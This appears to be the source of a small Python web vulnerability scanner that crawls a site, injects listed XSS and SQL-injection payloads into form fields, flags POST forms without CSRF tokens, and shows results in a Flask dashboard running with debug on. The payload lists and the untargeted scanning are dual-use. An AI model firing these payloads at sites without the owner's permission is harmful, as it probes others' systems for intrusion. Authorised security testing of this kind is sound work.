import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import json, csv, os
from flask import Flask, request, render_template_string

#  Payloads 

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1337)>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1 --",
    "' OR 'a'='a",
    "\" OR \"\"=\"",
    "' UNION SELECT NULL,NULL--"
]


CSRF_PAYLOADS = [
    "<form action='http://evil.com' method='POST'><input type='submit'></form>"
]

results = {"xss": [], "sqli": [], "csrf": []}
visited_links = set()

#  Form Parsing 
def get_forms(url):
    try:

        soup = BeautifulSoup(requests.get(url, timeout=5).content, "html.parser")
        return soup.find_all("form")
    except Exception:
        return []

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all(["input", "textarea"]):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        if name:
            inputs.append({"type": input_type, "name": name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] in ["text", "search"]:
            data[input_tag["name"]] = payload
        else:
            data[input_tag["name"]] = "test"
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, timeout=5)
        else:
            return requests.get(target_url, params=data, timeout=5)
    except Exception:
        return None

#  Vulnerabilty Tests 
def test_xss(url):
    forms = get_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            res = submit_form(details, url, payload)
            if res and payload in res.text:
                results["xss"].append({"url": url, "form": details, "payload": payload})
                break

def test_sqli(url):
    forms = get_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in SQLI_PAYLOADS:
            res = submit_form(details, url, payload)
            if res and ("sql" in res.text.lower() or "error" in res.text.lower()):
                results["sqli"].append({"url": url, "form": details, "payload": payload})
                break

def test_csrf(url):
    forms = get_forms(url)
    for form in forms:
        if form.attrs.get("method", "get").lower() == "post":
            if "csrf" not in str(form).lower():  # naive check for CSRF token
                results["csrf"].append({"url": url, "form": str(form)[:200]})

#  Crawler 
def get_links(url, domain):
    links = set()
    try:
        soup = BeautifulSoup(requests.get(url, timeout=5).content, "html.parser")
        for a_tag in soup.find_all("a", href=True):
            link = urljoin(url, a_tag["href"])
            if urlparse(link).netloc == domain:
                links.add(link.split("#")[0])
    except Exception:
        pass
    return links

def crawl(start_url, max_pages=10):
    domain = urlparse(start_url).netloc
    to_visit = [start_url]

    while to_visit and len(visited_links) < max_pages:
        url = to_visit.pop()
        if url in visited_links:
            continue
        visited_links.add(url)

        print(f"[+] Scanning: {url}")
        test_xss(url)
        test_sqli(url)
        test_csrf(url)

        new_links = get_links(url, domain)
        to_visit.extend(new_links - visited_links)
#  Reporting 
def save_report_json(filename="report.json"):
    with open(filename, "w") as f:
        json.dump(results, f, indent=4)

def save_report_csv(filename="report.csv"):
    with open(filename, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["Type", "URL", "Payload/Form"])
        for vuln_type, findings in results.items():
            for finding in findings:
                payload = finding.get("payload", finding.get("form"))
                writer.writerow([vuln_type, finding["url"], payload])

#  Flask Dashboard 
app = Flask(__name__)



dashboard_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Web Scanner Dashboard</title>
</head>
<body>
    <h1>Python Web Vulnerability Scanner</h1>
    <form method="POST" action="/scan">
        <label>Target URL:</label>
        <input type="text" name="url" required>
        <button type="submit">Start Scan</button>
    </form>
    <h2>Results</h2>
    <pre>{{ results }}</pre>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return render_template_string(dashboard_html, results="No scan yet.")

@app.route("/scan", methods=["POST"])
def scan():
    global results, visited_links
    results = {"xss": [], "sqli": [], "csrf": []}
    visited_links = set()

    url = request.form.get("url")
    crawl(url, max_pages=5)

    save_report_json()
    save_report_csv()
    return render_template_string(dashboard_html, results=json.dumps(results, indent=4))

if __name__ == "__main__":
    #  Flask dashboard
    app.run(debug=True, port=5000)
